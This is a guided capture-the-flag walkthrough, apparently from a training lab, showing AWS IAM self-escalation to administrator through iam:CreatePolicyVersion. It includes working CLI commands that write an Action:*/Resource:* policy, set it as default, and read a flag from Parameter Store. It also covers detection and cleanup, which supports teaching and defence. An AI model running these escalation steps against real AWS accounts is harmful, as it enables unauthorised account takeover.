# Guided Walkthrough: Self-Escalation via iam:CreatePolicyVersion

This scenario demonstrates a privilege escalation vulnerability where a role can modify its own permissions by creating new versions of managed policies attached to itself. The attacker starts with minimal permissions but can grant themselves administrator access by creating a new policy version with elevated permissions. This technique is classified as self-escalation because the role is modifying the exact policy that controls its own access — no lateral movement to a separate, more-privileged principal is required.

In real environments, this misconfiguration appears when IAM administrators grant `iam:CreatePolicyVersion` to a role without scoping the resource constraint carefully. If the permission is granted on `arn:aws:iam::*:policy/*` or specifically on a policy attached to that same role, the role can overwrite its own permissions. This is a classic example of a circular privilege escalation path — the very policy that grants the dangerous permission is the one that gets replaced.

AWS allows up to five versions of a managed policy to exist at any time. Creating a new version with `--set-as-default` immediately makes it the active policy, meaning the escalation takes effect within seconds (after IAM propagation).

## The Challenge

You start with credentials for `pl-prod-iam-001-to-admin-starting-user`, an IAM user with one meaningful permission: the ability to assume `pl-prod-iam-001-to-admin-starting-role`. That role has a managed policy (`pl-prod-iam-001-to-admin-policy`) attached to it that currently grants only `iam:CreatePolicyVersion` and `iam:ListPolicyVersions` scoped to itself.

Your goal is to end up with full administrator access — specifically, to be able to call `iam:ListUsers`, `s3:ListAllMyBuckets`, or any other privileged API — by exploiting the policy versioning capability.

## Reconnaissance

First, verify you are operating as the expected starting user.

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-001-to-admin-starting-user
```

Now enumerate what the user can do. The user itself has very limited permissions — mainly `sts:AssumeRole` on the starting role. Check what roles are assumable:

```bash
# The trust policy on the starting role already permits this user.
# Confirm by attempting the assume-role — if it succeeds, you have a foothold.
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-001-to-admin-starting-role \
  --role-session-name recon-session \
  --query 'AssumedRoleUser.Arn' --output text
```

Once you have credentials for the starting role, check what policies are attached to it:

```bash
export AWS_ACCESS_KEY_ID="<role_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<role_secret_access_key>"
export AWS_SESSION_TOKEN="<role_session_token>"

aws iam list-attached-role-policies \
  --role-name pl-prod-iam-001-to-admin-starting-role
# {
#   "AttachedPolicies": [
#     { "PolicyName": "pl-prod-iam-001-to-admin-policy",
#       "PolicyArn": "arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy" }
#   ]
# }
```

Inspect the existing policy version to understand what permissions are currently in effect:

```bash
# First, find the default version ID
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy

# Then view the policy document for the default version
aws iam get-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy \
  --version-id v1
```

The policy grants `iam:CreatePolicyVersion` on itself. That is your escalation vector.

## Exploitation

Create a temporary policy document that grants full administrator access:

```bash
cat > /tmp/admin-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF
```

Now use `iam:CreatePolicyVersion` to replace the current policy with the admin document, setting it as the new default immediately:

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy \
  --policy-document file:///tmp/admin-policy.json \
  --set-as-default
```

Wait approximately 15 seconds for IAM policy changes to propagate, then verify the escalation worked.

## Verification

```bash
# Confirm the new policy version is active
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy

# Test a privileged action that was previously denied
aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text

# Test S3 access
aws s3 ls
```

If `iam:ListUsers` returns a list of IAM users (instead of an `AccessDenied` error), the privilege escalation succeeded. The role now has full `AdministratorAccess` and can perform any action in the AWS account.

## What Happened

Starting from a low-privilege IAM user, you assumed a role that held a single dangerous permission: `iam:CreatePolicyVersion` scoped to its own attached managed policy. By creating a new policy version with `Action: *` / `Resource: *` and setting it as the default, you replaced the role's restrictive policy with an unrestricted one — effectively granting yourself full administrator access without any other principal's involvement.

This is the canonical self-escalation pattern. It requires no lateral movement, no cross-account access, and no interaction with other services. A CSPM tool performing static policy analysis should flag any role where `iam:CreatePolicyVersion` is permitted on a policy that is itself attached to that same role, because the permission creates a closed loop: the role controls its own permissions boundary.

Clean up the attack artifact by running `plabs cleanup iam-001-iam-createpolicyversion` (or `./cleanup_attack.sh`), which will delete the malicious policy version and restore the original restricted policy.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the new policy version granting `Action: *` on `Resource: *` now provides implicitly via the starting role session.

Using the starting role session credentials (which now hold the admin policy version applied in the previous step), read the flag:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/iam-001-to-admin \
  --query 'Parameter.Value' \
  --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.
